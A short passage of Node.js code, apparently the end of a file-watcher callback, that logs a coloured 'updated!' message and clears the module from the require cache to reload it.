  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
